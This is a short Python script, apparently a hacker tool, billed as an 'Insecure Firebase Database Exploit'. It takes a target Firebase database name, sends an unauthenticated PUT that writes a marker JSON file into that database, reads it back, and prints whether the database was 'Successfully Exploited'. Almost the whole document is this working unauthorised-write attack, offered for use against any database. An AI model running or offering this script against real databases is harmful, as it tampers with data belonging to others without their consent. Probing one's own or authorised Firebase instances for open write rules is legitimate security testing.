# Author:
'''
s4nh4xor
Updated: 30-09-2020
'''
import requests
import urllib.request, urllib.parse, urllib.error
print("""
 
â–‘â–ˆâ”€â–‘â–ˆ â”€â–ˆâ–€â–ˆâ”€ â–€â–„â–‘â–„â–€ â–‘â–ˆâ–€â–€â–€â–ˆ â–‘â–ˆâ–€â–€â–ˆ ã€€ â–‘â–ˆâ–€â–€â–€ â–€â–„â–‘â–„â–€ â–‘â–ˆâ–€â–€â–ˆ â–‘â–ˆâ”€â”€â”€ â–‘â–ˆâ–€â–€â–€â–ˆ â–€â–ˆâ–€ â–€â–€â–ˆâ–€â–€ 
â–‘â–ˆâ–€â–€â–ˆ â–ˆâ–„â–„â–ˆâ–„ â”€â–‘â–ˆâ”€â”€ â–‘â–ˆâ”€â”€â–‘â–ˆ â–‘â–ˆâ–„â–„â–€ ã€€ â–‘â–ˆâ–€â–€â–€ â”€â–‘â–ˆâ”€â”€ â–‘â–ˆâ–„â–„â–ˆ â–‘â–ˆâ”€â”€â”€ â–‘â–ˆâ”€â”€â–‘â–ˆ â–‘â–ˆâ”€ â”€â–‘â–ˆâ”€â”€ 
â–‘â–ˆâ”€â–‘â–ˆ â”€â”€â”€â–ˆâ”€ â–„â–€â–‘â–€â–„ â–‘â–ˆâ–„â–„â–„â–ˆ â–‘â–ˆâ”€â–‘â–ˆ ã€€ â–‘â–ˆâ–„â–„â–„ â–„â–€â–‘â–€â–„ â–‘â–ˆâ”€â”€â”€ â–‘â–ˆâ–„â–„â–ˆ â–‘â–ˆâ–„â–„â–„â–ˆ â–„â–ˆâ–„ â”€â–‘â–ˆâ”€â”€

################## "ð•€ð•Ÿð•¤ð•–ð•”ð•¦ð•£ð•–-ð”½ð•šð•£ð•–ð•“ð•’ð•¤ð•–-ð”»ð•’ð•¥ð•’ð•“ð•’ð•¤ð•–-ð”¼ð•©ð•¡ð•ð• ð•šð•¥   ##################

#######  Usage   : http://[username].firebaseio.com write  ####### 

#########  Info    : Just Username needed . Dont Enter full url   #########
                                                            

""")

#Give Data
print ("[>] Input Data for exploit\n")
site = input("[+] Enter firebase USERNAME : ")
file = input("[+] Enter your filename    : ")
name = input("[+] Enter your name        : ")


#Payload
site_url = "https://"+site+".firebaseio.com/"+file+".json"
data = {"Exploit": "Successfull", "name": 'name'}
response = requests.put(site_url, json=data)

#Collecting file
print("""
<<======================================================================>>
""")
if response.status_code == 200:
    print ("[*] Exploited\n")
    print(("File Created: https://"+site+".firebaseio.com/"+file+".json\n"))
else:
    print ("[*] Not Exploited\n")
    print ("No File Created")
print("""
<<======================================================================>>
""")
print("""If you get a response 'Permission Denied' with 'Successfully
Exploited' This shows Exploit is written but can't be read.
Verify by visiting the URL""")
print(" ")
print("[>] Response\n")
r = requests.get("https://"+site+".firebaseio.com/"+file+".json")
print(r.text)
print("""
<<======================================================================>>
""")
#Reasoning
if response.status_code == 200:
 print ("[>>] Successfully Exploited")
elif response.status_code == 401:
 print ("[x] Not Exploitable \n[!] Reason: All Permissions Denied")
elif response.status_code == 404:
 print ("[x] Database Not Found \n[!] Reason: Firebase Database Not Found")
else:
 print ("[x] Unknown Error \n[!] Reason: Unknown Error\n")

print("" "")
